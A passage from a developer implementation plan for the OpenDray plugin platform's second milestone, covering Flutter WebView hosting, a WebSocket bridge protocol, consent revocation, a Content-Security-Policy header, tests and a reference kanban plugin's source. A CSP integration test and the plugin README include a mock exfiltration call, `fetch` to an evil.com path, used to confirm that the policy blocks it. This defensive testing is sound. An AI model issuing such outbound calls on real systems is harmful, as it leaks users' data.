- **Acceptance:** kanban opens (even if in a separate window) on Linux desktop builds. Documented in the plugin authoring guide (`docs/plugin-platform/11-developer-experience.md` patch).
- **Complexity:** M
- **Risk/Mitigation:** Medium — webview_flutter's desktop support is nascent. Mitigation: desktop is an acceptance-optional platform per the roadmap wording ("runs on Android, iOS, and desktop" — desktop covers Linux/macOS/Windows Flutter desktop, not server-side). Ship `.exe`/`.app`/`.deb` for engineering dogfood only.

### T17 — Flutter: activity bar rail
- **Depends on:** T3 (server exposes activity bar), T14 (SSE), T16
- **Create:** `/home/linivek/workspace/opendray/app/lib/features/workbench/activity_bar.dart`
- **Modify:** `/home/linivek/workspace/opendray/app/lib/features/workbench/workbench_models.dart` — add DTOs `WorkbenchActivityBarItem`, `WorkbenchView`, `WorkbenchPanel` (mirroring Go structs). Extend `FlatContributions.fromJson`. `/home/linivek/workspace/opendray/app/lib/features/workbench/workbench_service.dart` — extend getters; listen to SSE for `contributionsChanged` + refetch. `/home/linivek/workspace/opendray/app/lib/features/dashboard/dashboard_page.dart` — mount `ActivityBar` at the left rail (tablet) / bottom nav overflow (phone) per 08-workbench-slots.md.
- **Phone collapse rule:** per 08-workbench-slots.md, >4 items collapse into a "More" sheet.
- **Acceptance:** after installing kanban, the kanban icon appears in the rail within 200 ms (via SSE). Tapping opens the associated view.
- **Tests:** widget tests `test/features/workbench/activity_bar_test.dart` — 3 items render, 5 items collapse, tap invokes `WorkbenchService.openView`.
- **Complexity:** M

### T18 — Flutter: view host container
- **Depends on:** T16, T17
- **Create:** `/home/linivek/workspace/opendray/app/lib/features/workbench/view_host.dart`
- **Modify:** `/home/linivek/workspace/opendray/app/lib/features/dashboard/dashboard_page.dart` — wrap main content in `ViewHost` which maps the currently-focused view id to either a `PluginWebView` (render=webview) or a `DeclarativeViewHost` placeholder (render=declarative; declarative rendering is post-M2 polish, ship stub that says "Declarative views arrive in M5 — use webview for now").
- **Acceptance:** tapping kanban activity icon loads kanban ui/index.html; swipe down closes; re-tapping re-opens cached view.
- **Tests:** widget test mounts ViewHost with a fake WebView constructor, asserts route wiring.
- **Complexity:** M

### T19 — Flutter: panel slot
- **Depends on:** T3, T16
- **Create:** `/home/linivek/workspace/opendray/app/lib/features/workbench/panel_slot.dart`
- **Modify:** `/home/linivek/workspace/opendray/app/lib/features/session/session_page.dart` — add a bottom-drawer slot that lists contributed panels and hosts a `PluginWebView` when opened.
- **Phone:** swipe up from bottom edge reveals the drawer; tap a tab label to switch panels.
- **Tablet:** always-visible tab bar at the bottom.
- **Acceptance:** a plugin declaring `contributes.panels` (kanban does NOT in M2; a test-only fixture does) gets a tab in the session page bottom drawer.
- **Tests:** widget test with two contributed panels.
- **Complexity:** M

### T20 — Flutter: plugin bridge channel + storage/events client
- **Depends on:** T16
- **Modify:** `/home/linivek/workspace/opendray/app/lib/features/workbench/plugin_bridge_channel.dart` (created in T16 but concrete protocol landing here).
- **Core:**
  - Opens a `WebSocketChannel` to `/api/plugins/{name}/bridge/ws` with bearer auth.
  - Pumps envelopes from JS postMessage → WS; pumps WS → JS via `runJavaScript`.
  - Tracks outstanding call ids, matches responses to resolvers in the shim.
  - On reconnect (network hiccup), resubscribes all recorded `events.subscribe` handles.
- **Acceptance:** kanban's JS can call all three namespaces end-to-end.
- **Tests:** widget test with a mock `WebSocketChannel` that records every envelope; asserts shim echoes correctly.
- **Complexity:** M

### T21 — Flutter: runtime consent toggles UI
- **Depends on:** T12
- **Create:** `/home/linivek/workspace/opendray/app/lib/features/settings/plugin_consents_page.dart`
- **Modify:** `/home/linivek/workspace/opendray/app/lib/core/api/api_client.dart` — add `getPluginConsents`, `revokePluginCapability`, `revokeAllPluginConsents`.
- **Acceptance:** user flips "Storage" toggle off for kanban → Flutter POSTs `DELETE /api/plugins/kanban/consents/storage` → next `storage.set` from kanban WebView fails with EPERM and shows a SnackBar. UI doesn't crash; toggle can be flipped back on.
- **Tests:** widget test asserts toggle state → API call mapping.
- **Complexity:** M

### T22 — Reference plugin `plugins/examples/kanban/`
- **Depends on:** T1, T2 (validation)
- **Create:** `/home/linivek/workspace/opendray/plugins/examples/kanban/manifest.json`, `ui/index.html`, `ui/main.js`, `ui/styles.css`, `README.md`
- **Acceptance:** see §10 for full bodies. Passes `opendray plugin validate ./plugins/examples/kanban`. After install + view open, the kanban board lets user add/delete cards; state survives restart (via `storage.set/get`); an idle-session event draws a "session idle" banner.
- **Tests:** covered by T23 e2e.
- **Complexity:** S (plan-wise); M (implementation)

### T23 — E2E test extension for kanban
- **Depends on:** T7, T8, T10, T11, T12, T14, T15, T22
- **Create:** extend `/home/linivek/workspace/opendray/plugin/e2e_test.go` with `TestE2E_KanbanFullLifecycle` (build tag `//go:build e2e`).
- **Scenario:**
  1. Install kanban via `POST /api/plugins/install` (local source, `OPENDRAY_ALLOW_LOCAL_PLUGINS=1`).
  2. Confirm token.
  3. Subscribe SSE `/api/workbench/stream` and assert `contributionsChanged` received.
  4. `GET /api/workbench/contributions` → contains kanban's activity bar + view.
  5. Fetch the index.html asset via `GET /api/plugins/kanban/assets/index.html` — assert CSP header, body length > 0.
  6. Open a WS to `/api/plugins/kanban/bridge/ws`.
  7. Send `storage.set` via WS → assert OK + DB row present.
  8. Send `storage.get` → assert same value returned.
  9. Send `events.subscribe {name:"session.*"}` → assert stream chunk when a fake session event is pushed into `HookBus`.
  10. `DELETE /api/plugins/kanban/consents/storage`; send `storage.set` again; assert EPERM **within 200 ms wall-clock** of the DELETE returning.
  11. Restart the test harness (new `gateway.Server`, same DB); re-open WS; `storage.get` still returns the original value (persistence).
  12. `DELETE /api/plugins/kanban` → assets 404, `plugin_kv` rows cascade-deleted.
- **Acceptance:** `go test -race -tags=e2e ./plugin/...` passes. Time-budget for the 200 ms SLO step asserted with a hard deadline.
- **Complexity:** L
- **Risk/Mitigation:** High — timing flakiness. Mitigation: the SLO step uses `time.Now()` before DELETE and after EPERM response; test machines typically meet <50 ms.

### T24 — Documentation updates
- **Depends on:** T8, T16, T20
- **Modify:** `/home/linivek/workspace/opendray/docs/plugin-platform/11-developer-experience.md` (or create if missing) — add "WebView plugin authoring: the 10-minute tutorial". `/home/linivek/workspace/opendray/docs/plugin-platform/10-security.md` — add a paragraph stating desktop WebView has "soft isolation" only in M2. `/home/linivek/workspace/opendray/docs/plugin-platform/SUMMARY.md` — mark M2 items delivered.
- **Acceptance:** new plugin author can follow the guide to ship a webview plugin in ≤30 minutes.
- **Complexity:** S

### T25 — CSP integration test
- **Depends on:** T8
- **Create:** `/home/linivek/workspace/opendray/gateway/plugins_assets_csp_test.go`
- **Scenario:** (i) fetch every content type the kanban bundle ships (html/js/css/png) and assert the CSP header is byte-exact against a golden string. (ii) Load the HTML in a Flutter widget test's headless WebView, attempt `fetch("https://evil.com/exfil")` in the JS; assert the WebView's console emits a CSP violation.
- **Acceptance:** both checks pass.
- **Complexity:** M

---

## 3. Suggested linear ordering

Critical path (single thread, 18 sequential hops):

```
T1 → T2 → T3 → T5 → T6 → T7 (stub) → T8 → T10 → T11 → T9 → T12 → T14 → T15 → T22 → T16 → T17 → T18 → T23
```

### Fork points

**After T1 + T5 land (the first-PR seam; see §9)** three branches can run in parallel:

- **Branch A — Server core:** T3 → T6 → T7 → T9, T10, T11 (parallel once T6 lands) → T12 → T14 → T15 → T23.
- **Branch B — Asset + CSP:** T8 → T25 (independent of the bridge; unblocks T16 rendering).
- **Branch C — Flutter:** T16 → T17, T18, T19, T20 (the four are parallel once T16 ships) → T21.

**T22** (reference plugin) has no server dependency beyond T1; it can be authored as the SDK fixture very early and used as the seed for every integration test.
**T4** (compat extension) is independent and can land anytime after T1.
**T13** (command dispatcher openView) lands once T3 exposes view lookup; it's independent of the bridge WS.

---

## 4. Interfaces locked in M2

### 4.1 Go types introduced (authoritative)

```go
// plugin/manifest.go additions
type ActivityBarItemV1 struct { ID, Icon, Title, ViewID string }
type ViewV1            struct { ID, Title, Container, Icon, When, Render, Entry string }
type PanelV1           struct { ID, Title, Icon, Position, Render, Entry string }
// ContributesV1 gains: ActivityBar []ActivityBarItemV1; Views []ViewV1; Panels []PanelV1

// plugin/contributions/registry.go additions
type OwnedActivityBarItem struct{ PluginName string; plugin.ActivityBarItemV1 }
type OwnedView            struct{ PluginName string; plugin.ViewV1 }
type OwnedPanel           struct{ PluginName string; plugin.PanelV1 }
// FlatContributions gains: ActivityBar, Views, Panels
func (r *Registry) HasView(plugin, viewId string) bool      // new, used by T13

// plugin/bridge/protocol.go (T5)
type Envelope struct{ ... }    // see T5 for full spec
type WireError struct{ Code, Message string; Data json.RawMessage }
func NewOK / NewErr / NewStreamChunk / NewStreamEnd

// plugin/bridge/manager.go (T6)
type Manager struct { ... }
type Conn    struct { Plugin string; /* unexported */ }
type ConsentChange struct { Plugin, Cap string; Revoked bool }
func (m *Manager) Register(plugin string, c *Conn)
func (m *Manager) Unregister(plugin string, c *Conn)
func (m *Manager) InvalidateConsent(plugin, cap string)
func (m *Manager) OnConsentChanged(plugin string) <-chan ConsentChange

// plugin/bridge/api_*.go (T9/T10/T11)
type Dispatcher interface {
    Dispatch(ctx context.Context, plugin, method string, args json.RawMessage, conn *Conn) (any, error)
}
// WorkbenchAPI, StorageAPI, EventsAPI all satisfy Dispatcher.

// kernel/store/plugin_kv.go (T10)
func (d *DB) KVGet(ctx context.Context, plugin, key string) (json.RawMessage, bool, error)
func (d *DB) KVSet(ctx context.Context, plugin, key string, value json.RawMessage) error
func (d *DB) KVDelete(ctx context.Context, plugin, key string) error
func (d *DB) KVList(ctx context.Context, plugin, prefix string) ([]string, error)

// kernel/store/plugin_consents.go (T12 addition)
func (d *DB) UpdateConsentPerms(ctx context.Context, name string, perms json.RawMessage) error

// gateway additions
type WorkbenchBus struct{ ... }
func (b *WorkbenchBus) Publish(ev WorkbenchEvent)
type WorkbenchEvent struct { Kind, Plugin string; Payload json.RawMessage }
```

### 4.2 HTTP + WS endpoints introduced

| Method + Path | Auth | Request / Protocol | Response |
|---|---|---|---|
| `GET /api/plugins/{name}/assets/*` | JWT | — | 200 + file bytes + CSP header / 400 EBADPATH / 404 |
| `GET /api/plugins/{name}/bridge/ws` | JWT + Origin check | WebSocket upgrade; envelope protocol | 101 Switching Protocols / 403 / 404 |
| `GET /api/plugins/{name}/consents` | JWT | — | 200 `{"storage":true,"events":["session.*"],...}` |
| `DELETE /api/plugins/{name}/consents/{cap}` | JWT | — | 200 `{revoked:"storage"}` / 400 EINVAL / 404 |
| `DELETE /api/plugins/{name}/consents` | JWT | — | 200 `{revoked:"all"}` |
| `GET /api/workbench/stream` | JWT | SSE | 200 event-stream (heartbeat every 20 s) |

### 4.3 WS handshake rules

- Subprotocol: none (raw JSON messages).
- `Origin` must match one of: `app://opendray`, configured frontend host URL, `http://localhost:*`, `http://127.0.0.1:*`. Otherwise 403 before upgrade.
- `Authorization: Bearer <jwt>` required (the same middleware used by all protected routes; WS upgrade respects headers because chi calls `Middleware.ServeHTTP` before the handler body runs).
- Read deadline 60 s (ping/pong every 30 s); write deadline 10 s per envelope.
- Max message size 1 MiB (matches `bodySizeLimiter` on the HTTP side).

### 4.4 JSON contribution schema (accepted at install time)

```json
"contributes": {
  "activityBar": [
    { "id": "kanban.activity", "icon": "icons/kanban.svg",
      "title": "Kanban", "viewId": "kanban.board" }
  ],
  "views": [
    { "id": "kanban.board", "title": "Kanban Board",
      "container": "activityBar", "render": "webview",
      "entry": "index.html" }
  ],
  "panels": [ /* optional, same shape */ ]
}
```

### 4.5 TypeScript bridge surface shipped in M2

```ts
// From @opendray/plugin-sdk (subset of the full 04-bridge-api.md surface).
interface OpenDray {
  version: string;
  plugin: { name: string; version: string; publisher: string; dataDir: string; workspaceRoot?: string };
  workbench: {
    showMessage(msg: string, opts?: { kind?: 'info'|'warn'|'error'; durationMs?: number }): Promise<void>;
    openView(viewId: string): Promise<void>;
    updateStatusBar(id: string, patch: { text?: string; tooltip?: string; command?: string }): Promise<void>;
    runCommand(commandId: string, ...args: unknown[]): Promise<unknown>;
    theme(): Promise<{ id: string; kind: 'light'|'dark'|'high-contrast' }>;
    onThemeChange(cb: (t: { id: string; kind: string }) => void): { dispose(): void };
  };
  storage: {
    get<T = unknown>(key: string, fallback?: T): Promise<T>;
    set(key: string, value: unknown): Promise<void>;
    delete(key: string): Promise<void>;
    list(prefix?: string): Promise<string[]>;
  };
  events: {
    subscribe(name: string, cb: (ev: unknown) => void): { dispose(): void };
    publish(name: string, payload: unknown): Promise<void>;
  };
}
```

Any other `opendray.*` namespace called in M2 throws `EUNAVAIL` — the TS types expose the full 04-bridge-api.md surface for authors, but runtime rejects non-M2 namespaces.

### 4.6 CSP header (verbatim)

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; connect-src 'self' ws: wss:; img-src 'self' data: blob:; object-src 'none'; frame-ancestors 'none'; base-uri 'self'
```

`'self'` for the WebView resolves to the gateway origin because that's where assets are served from. `connect-src ws: wss:` allows the bridge WS to the same origin. `frame-ancestors 'none'` defends against the plugin UI being iframed by another page.

---

## 5. Test strategy

### Unit tests (go test -race, target ≥80% on touched packages)
- `plugin/manifest_v1_test.go` extended (T1, T2)
- `plugin/manifest_validate_test.go` extended (T2)
- `plugin/contributions/registry_test.go` extended (T3)
- `plugin/compat/synthesize_test.go` extended (T4)
- `plugin/bridge/protocol_test.go` (T5)
- `plugin/bridge/manager_test.go` (T6)
- `plugin/bridge/api_workbench_test.go` (T9)
- `plugin/bridge/api_storage_test.go` (T10)
- `plugin/bridge/api_events_test.go` (T11)
- `kernel/store/plugin_kv_test.go` (T10)
- `kernel/store/plugin_consents_test.go` extended (T12)
- `plugin/commands/dispatcher_test.go` extended (T13)

### Integration tests
- `gateway/plugins_bridge_test.go` (T7) — uses `httptest.NewServer` + `websocket.Dialer` client.
- `gateway/plugins_assets_test.go` (T8) including `plugins_assets_csp_test.go` (T25).
- `gateway/plugins_consents_test.go` (T12) including the 200 ms SLO test.
- `gateway/workbench_stream_test.go` (T14).
- `gateway/plugins_install_test.go` extended (T15).

### End-to-end tests (build tag `//go:build e2e`)
- `plugin/e2e_test.go` gets `TestE2E_KanbanFullLifecycle` (T23) alongside the M1 `TestE2E_TimeNinjaFullLifecycle` which must continue to pass untouched.

### Flutter widget tests
- `test/features/workbench/webview_host_test.dart` (T16)
- `test/features/workbench/activity_bar_test.dart` (T17)
- `test/features/workbench/view_host_test.dart` (T18)
- `test/features/workbench/panel_slot_test.dart` (T19)
- `test/features/workbench/plugin_bridge_channel_test.dart` (T20)
- `test/features/settings/plugin_consents_page_test.dart` (T21)

### Testing WebView↔bridge round-trips
- Go side: `httptest.NewServer` + `websocket.Dialer` simulates the Flutter WebView. We drive envelopes directly over WS and assert responses. No real WebView needed for 90% of coverage.
- Flutter side: widget tests stub the `WebViewController` + `WebSocketChannel`; the test asserts the shim emits the correct envelopes (the JS shim itself is loaded as a string constant and exercised via a lightweight JS interpreter test — but for M2 we do NOT require the real WebView to run in CI because it's platform-native and expensive. The e2e test uses the real WebView on a local dev run and in a nightly CI lane).

### Coverage gate
CI continues to run `go test -race -cover ./...` with 80% line coverage on every touched package. Untouched packages exempt.

---

## 6. Migration & compat

### DB migrations
**Zero new SQL files.** M1 already shipped `011_plugin_kv.sql` and `012_plugin_secret.sql` as scaffolds; M2 adds the writers. The existing `ON DELETE CASCADE` on `plugin_name REFERENCES plugins(name)` already handles uninstall cleanup.

### M1 contracts preserved
- Every M1 HTTP endpoint continues to work unchanged: `/api/plugins/install`, `/install/confirm`, `DELETE /api/plugins/{name}`, `/api/plugins/{name}/audit`, `GET /api/workbench/contributions`, `POST /api/plugins/{name}/commands/{id}/invoke`.
- Existing `ContributesV1` serialisation is additive — legacy clients that only read commands/statusBar/keybindings/menus keep working (new fields omitempty).
- `FlatContributions` JSON is additive — existing Flutter M1 builds that parse only those four fields continue to function.
- `plugin.Runtime.Register` / `.Remove` signatures unchanged.
- Manifest v1 validator already accepts `contributes.activityBar`/`views`/`panels` via pass-through per M1's design; T2 adds strict validation. Confirm by running M1's golden-file test on every bundled manifest after T2 merges.

### Compat invariants
1. All 17 bundled manifests under `plugins/agents/*` + `plugins/panels/*` continue to load byte-for-byte unchanged.
2. The existing panel plugin HTTP APIs (`/api/docs/*`, `/api/files/*`, `/api/git/*`, `/api/database/*`, `/api/tasks/*`, `/api/logs/*`) are untouched.
3. The compat synthesizer (T4) is additive-only for panel types; agent types unchanged.
4. `time-ninja` reference plugin continues to pass its M1 E2E test word-for-word.

### Rollback
Forward-only. If M2 needs emergency rollback, the Flutter workbench can be feature-flagged: setting `OPENDRAY_DISABLE_WEBVIEW_PLUGINS=1` makes `pluginsBridgeWS` return 503 and the Flutter activity-bar hides webview-form plugins. Backend still serves assets (harmless). Server-side rollback is achieved by reverting the T7 merge commit; no schema change to undo.

---

## 7. Definition of Done

- [ ] `kanban` example plugin installs via the M1 flow (`POST /api/plugins/install` → consent → `/install/confirm`) on Android, iOS, and desktop Flutter builds.
- [ ] Kanban's activity-bar icon renders within 200 ms of install confirmation (SSE `contributionsChanged` observed).
- [ ] Tapping the icon opens the kanban view hosted in a WebView; the UI lets the user add and delete cards.
- [ ] Card state survives backend restart (persisted via `opendray.storage.set/get` to `plugin_kv`).
- [ ] Kanban subscribes to `session.*` events and displays a banner when a session goes idle.
- [ ] `DELETE /api/plugins/kanban/consents/storage` causes the next `storage.set` from the kanban WebView to fail with `EPERM` within **200 ms** wall-clock of the DELETE returning. Verified by the `TestE2E_KanbanFullLifecycle` hard-deadline assertion.
- [ ] `M1` `time-ninja` continues to pass its M1 E2E test unchanged — zero regressions in `plugin/e2e_test.go::TestE2E_TimeNinjaFullLifecycle`.
- [ ] Every response from `/api/plugins/{name}/assets/*` carries the exact CSP header defined in §4.6. Verified by `plugins_assets_csp_test.go`.
- [ ] WebView console logs a CSP violation when plugin JS attempts a network request outside `self`/`ws:`/`wss:`.
- [ ] `go test -race -cover ./...` ≥ 80% on every package touched by M2.
- [ ] `go vet ./...` clean; `staticcheck ./...` clean on touched packages; `gosec ./...` introduces no new HIGH findings.
- [ ] `flutter test` passes: every M1 widget test still green + all new M2 widget tests green.
- [ ] All 17 bundled legacy manifests load byte-for-byte unchanged (golden-file assertion).
- [ ] iOS archive builds successfully. WebView loads the kanban bundle from `${PluginsDataDir}/kanban/<version>/ui/` served by the loopback gateway; no remote code is fetched at runtime. App Store review notes from 10-security.md copied verbatim into `ios/fastlane/metadata/review_notes.txt`.
- [ ] Settings → Plugins page lists kanban with per-capability toggle; flipping storage off causes the UI to show EPERM toasts from subsequent kanban calls.
- [ ] `opendray plugin validate ./plugins/examples/kanban` exits 0. A hand-crafted manifest with an orphan `activityBar.viewId` exits 1 with a helpful error.
- [ ] Docs: `/home/linivek/workspace/opendray/docs/plugin-platform/11-developer-experience.md` has a WebView plugin authoring tutorial; `10-security.md` mentions desktop "soft isolation" limitation; `SUMMARY.md` marks M2 items green.

---

## 8. Out-of-scope escape valves

Top 5 likely M2-blockers where implementers will feel the pull of later milestones, with sanctioned workarounds:

1. **"My plugin needs to read files from the workspace."**
   Workaround: `opendray.fs.*` is M3 (needs supervisor work for path-scope enforcement + watch). For M2, plugin authors persist user-entered data via `storage.set` or expose a contributed command that the host runs via M1's `exec`/`runTask` kinds. Document in 11-developer-experience.md.

2. **"I need to call an external HTTP API from my plugin JS."**
   Workaround: `opendray.http.*` is M3. CSP blocks direct `fetch()` to non-self origins. For M2, plugin authors can contribute an `exec`-kind command that calls `curl` host-side (requires `permissions.exec`), or build a backend helper into their server-side sidecar (M3). No bridge shortcut in M2.

3. **"Desktop WebView doesn't render inline; it pops a separate window."**
   Workaround: accepted M2 limitation documented in T16b. Inline desktop webview is an M6 DX polish item. Dogfood impact: engineering desktop builds get a modal window UX; mobile (the primary OpenDray target) is unaffected.

4. **"A plugin needs a runtime consent prompt (e.g. clipboard read on first use)."**
   Workaround: §4 of 05-capabilities.md only calls out `clipboard:read` and `llm.*` first-use prompts. Neither is in M2's shipped namespaces; defer until M3/M5. All M2 capabilities are install-time-granted, enforced on every call by the Gate.

5. **"Kanban needs live user presence / multi-device sync."**
   Workaround: out of scope for v1 entirely; there is no p2p channel between OpenDray instances. Plugin authors can build their own backend and talk via `http` (M3). M2 rejects the problem with grace.

---

## 9. First-PR seam

**Smallest mergeable commit that unlocks parallel work:** T1 + T3 + T5.

Contents:
- `/home/linivek/workspace/opendray/plugin/manifest.go` — extend `ContributesV1` with activityBar/views/panels fields + three new structs (T1).
- `/home/linivek/workspace/opendray/plugin/contributions/registry.go` — extend `FlatContributions` + `Flatten()` for the new slots (T3).
- `/home/linivek/workspace/opendray/plugin/bridge/protocol.go` — the Envelope / WireError types + constructors (T5).
- `/home/linivek/workspace/opendray/plugin/bridge/protocol_test.go` — round-trip + golden-file tests.
- `/home/linivek/workspace/opendray/plugin/manifest_v1_test.go` — extended compat + webview load tests.
- `/home/linivek/workspace/opendray/plugin/contributions/registry_test.go` — extended sort/flatten tests.

**Optional extra in the same PR:** a stubbed `/home/linivek/workspace/opendray/gateway/plugins_bridge.go` that registers `r.Get("/api/plugins/{name}/bridge/ws", s.pluginsBridgeWS)` and responds `501 ENOTIMPL`. This lets Flutter T16/T20 start wiring against the URL shape immediately.

Net behaviour change: zero rendered UI difference. New types are additive; old manifests load unchanged; old FlatContributions JSON just gains empty arrays.

Why first: unblocks three parallel branches (see §3). Anyone can start building against the types without stepping on each other.

Size target: ≤500 lines changed. Reviewable in one sitting.

---

## 10. Reference plugin spec — `plugins/examples/kanban/`

### Files to create

```
plugins/examples/kanban/
├── manifest.json
├── README.md
└── ui/
    ├── index.html
    ├── main.js
    └── styles.css
```

### `plugins/examples/kanban/manifest.json`

```json
{
  "$schema": "https://opendray.dev/schemas/plugin-manifest-v1.json",
  "name": "kanban",
  "version": "1.0.0",
  "publisher": "opendray-examples",
  "displayName": "Kanban",
  "description": "A minimal kanban board. M2 reference plugin — exercises activityBar, views, storage, workbench.showMessage, events.subscribe.",
  "icon": "📋",
  "engines": { "opendray": "^1.0.0" },
  "form": "webview",
  "activation": ["onView:kanban.board"],
  "contributes": {
    "activityBar": [
      { "id": "kanban.activity", "icon": "📋", "title": "Kanban", "viewId": "kanban.board" }
    ],
    "views": [
      { "id": "kanban.board", "title": "Kanban Board",
        "container": "activityBar", "render": "webview", "entry": "index.html" }
    ]
  },
  "permissions": {
    "storage": true,
    "events": ["session.idle", "session.start", "session.stop"]
  }
}
```

### `plugins/examples/kanban/ui/index.html`

```html
<!doctype html>
<html lang="en" data-theme="dark">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <title>Kanban</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <header id="topbar">
    <h1>Kanban</h1>
    <button id="addCard">+ Add card</button>
    <span id="sessionStatus" hidden></span>
  </header>
  <main>
    <section class="column" data-status="todo"><h2>To do</h2><ul></ul></section>
    <section class="column" data-status="doing"><h2>Doing</h2><ul></ul></section>
    <section class="column" data-status="done"><h2>Done</h2><ul></ul></section>
  </main>
  <script src="main.js" type="module"></script>
</body>
</html>
```

### `plugins/examples/kanban/ui/main.js`

```js
const STORAGE_KEY = "cards";
let cards = [];

async function loadCards() {
  cards = await opendray.storage.get(STORAGE_KEY, []);
  render();
}
async function saveCards() {
  await opendray.storage.set(STORAGE_KEY, cards);
}
function render() {
  for (const col of document.querySelectorAll(".column")) {
    const list = col.querySelector("ul");
    list.innerHTML = "";
    for (const c of cards.filter(c => c.status === col.dataset.status)) {
      const li = document.createElement("li");
      li.textContent = c.title;
      li.addEventListener("click", () => removeCard(c.id));
      list.appendChild(li);
    }
  }
}
async function addCard() {
  const title = "Card " + Math.floor(Math.random() * 1000);
  cards.push({ id: crypto.randomUUID(), title, status: "todo" });
  await saveCards();
  render();
  await opendray.workbench.showMessage(`Added "${title}"`, { kind: "info" });
}
async function removeCard(id) {
  cards = cards.filter(c => c.id !== id);
  await saveCards();
  render();
}
document.getElementById("addCard").addEventListener("click", addCard);
opendray.events.subscribe("session.idle", () => {
  const el = document.getElementById("sessionStatus");
  el.textContent = "a session is idle";
  el.hidden = false;
  setTimeout(() => el.hidden = true, 3000);
});
loadCards();
```

### `plugins/examples/kanban/ui/styles.css`

```css
:root { color-scheme: dark light; font-family: system-ui, sans-serif; }
body { margin: 0; padding: 16px; background: var(--od-editor-background, #0d1117); color: var(--od-editor-foreground, #eee); }
#topbar { display: flex; align-items: center; gap: 12px; margin-bottom: 16px; }
main { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
.column { background: rgba(255,255,255,0.05); border-radius: 8px; padding: 12px; min-height: 240px; }
.column h2 { margin: 0 0 8px; font-size: 14px; opacity: 0.7; }
.column ul { list-style: none; margin: 0; padding: 0; }
.column li { padding: 8px; margin: 4px 0; background: rgba(255,255,255,0.1); border-radius: 4px; cursor: pointer; }
#addCard { padding: 6px 12px; border: 0; border-radius: 4px; background: #238636; color: white; cursor: pointer; }
#sessionStatus { font-size: 12px; opacity: 0.7; }
```

### `plugins/examples/kanban/README.md`

```markdown
# kanban — OpenDray M2 reference plugin

Three columns, tap to delete. State saved in `opendray.storage`. Surfaces a banner when any session goes idle via `opendray.events`.

## Try it
1. `OPENDRAY_ALLOW_LOCAL_PLUGINS=1 opendray`
2. `opendray plugin install ./plugins/examples/kanban`
3. Consent screen shows: storage + events(session.idle,start,stop).
4. Tap the Kanban icon in the activity bar → "+ Add card" → the card persists across restart.
5. Revoke storage in Settings → card add fails with a "permission denied" toast within 200 ms.

## What this plugin proves
- activityBar → view → webview bundle end-to-end
- `opendray.storage.set/get` with cascade-delete on uninstall
- `opendray.workbench.showMessage` delivers a Flutter SnackBar
- `opendray.events.subscribe("session.idle")` fires via HookBus
- CSP enforces `script-src 'self' 'unsafe-eval'` — fetching https://evil.com fails
- Capability hot-revoke under 200 ms
```

### Preload JS shim (served from embedded Go asset at `/api/plugins/.runtime/opendray-shim.js`)

The shim is NOT in plugin bundles — it's injected by the Flutter host or served from a well-known path. Size budget: 40 lines (enforced in T16).

```js
(() => {
  const calls = new Map();
  let nextId = 1;
  function call(ns, method, args) {
    const id = String(nextId++);
    return new Promise((resolve, reject) => {
      calls.set(id, { resolve, reject });
      window.OpenDrayBridge.postMessage(JSON.stringify({ v: 1, id, ns, method, args }));
    });
  }
  window.__opendray_onMessage = (raw) => {
    const env = JSON.parse(raw);
    const pending = calls.get(env.id);
    if (!pending) return;
    calls.delete(env.id);
    if (env.error) pending.reject(new Error(`${env.error.code}: ${env.error.message}`));
    else pending.resolve(env.result);
  };
  const nsProxy = (ns, methods) => Object.fromEntries(
    methods.map(m => [m, (...args) => call(ns, m, args)]));
  window.opendray = {
    version: "1",
    plugin: window.__opendray_plugin_ctx || {},
    workbench: nsProxy("workbench", ["showMessage","openView","updateStatusBar","runCommand","theme","onThemeChange"]),
    storage:   nsProxy("storage",   ["get","set","delete","list"]),
    events:    { subscribe: (name, cb) => { /* stream envelope handling */ }, publish: (n, p) => call("events","publish",[n,p]) },
  };
})();
```

---

## 11. Bridge WS protocol — concrete semantics

### Request envelope (client → server)

```json
{ "v": 1, "id": "42", "ns": "storage", "method": "set",
  "args": ["cards", [{"id":"a","title":"x"}]] }
```

- `v` required, must equal `1`. Mismatch → server returns `{error:{code:"EINVAL",message:"unsupported version"}}`.
- `id` required for request/response RPCs; absent for fire-and-forget (not used in M2).
- `ns` + `method` required.
- `args` is a JSON array (positional) or object (named). M2 implementations pass as `json.RawMessage` to Dispatcher.

### Response envelope (server → client)

```json
{ "v": 1, "id": "42", "result": null }
```

### Error envelope

```json
{ "v": 1, "id": "42", "error": { "code": "EPERM", "message": "storage not granted" } }
```

Error codes (stable set, from 04-bridge-api.md): `EPERM`, `EINVAL`, `ENOENT`, `ETIMEOUT`, `EUNAVAIL`, `EINTERNAL`.

### Streaming envelope (server → client, for `events.subscribe`)

```json
{ "v": 1, "id": "42", "stream": "chunk", "data": { "type": "session.idle", "sessionId": "s1" } }
{ "v": 1, "id": "42", "stream": "end" }
```

Subscribe returns a response envelope with `{result: {subId: "42"}}` immediately, then emits chunks until the client unsubscribes (new method `events.unsubscribe {subId:"42"}`) or the Conn closes.

### Handshake

1. Flutter opens WS with bearer token.
2. Server validates origin + JWT, upgrades.
3. Server immediately sends a welcome envelope: `{v:1, ns:"bridge", method:"welcome", args:[{plugin:"kanban", version:"1.0.0", publisher:"opendray-examples", dataDir:"/abs/path"}]}`. Client shim stores this on `window.__opendray_plugin_ctx`.
4. Client is now free to send calls.

### Failure modes

- **Unknown method under known ns:** `{error:{code:"EUNAVAIL",message:"storage.frobnicate not implemented"}}`. The Conn stays open.
- **Capability denied:** `{error:{code:"EPERM",message:"storage not granted"}}`. Conn stays open.
- **Rate limit exceeded:** `{error:{code:"ETIMEOUT",message:"rate limit exceeded", data:{retryAfterMs:12345}}}`. Conn stays open.
- **Bridge disconnect mid-request:** any pending call's promise is rejected client-side when the WS close event fires. Shim iterates `calls` map and rejects all.
- **Plugin uninstalled during active WS:** Installer.Uninstall calls `bridgeMgr.CloseAllForPlugin(name, 1001, "plugin uninstalled")`. Flutter gets WS close; shim rejects pending promises; the WebView is unmounted by the Flutter workbench reacting to the SSE `contributionsChanged` event.
- **Envelope `v != 1`:** EINVAL, Conn stays open. (Forward-compat: v2 clients can downgrade.)
- **Malformed JSON:** EINVAL with `message:"invalid JSON envelope"`, Conn stays open. Three consecutive malformed envelopes close the Conn with code 1008 (policy violation).
- **Consent revoked while stream active (T12 flow):** server sends `{stream:"end", error:{code:"EPERM"}}` then proactively calls `events.unsubscribe` server-side; shim cleans up.

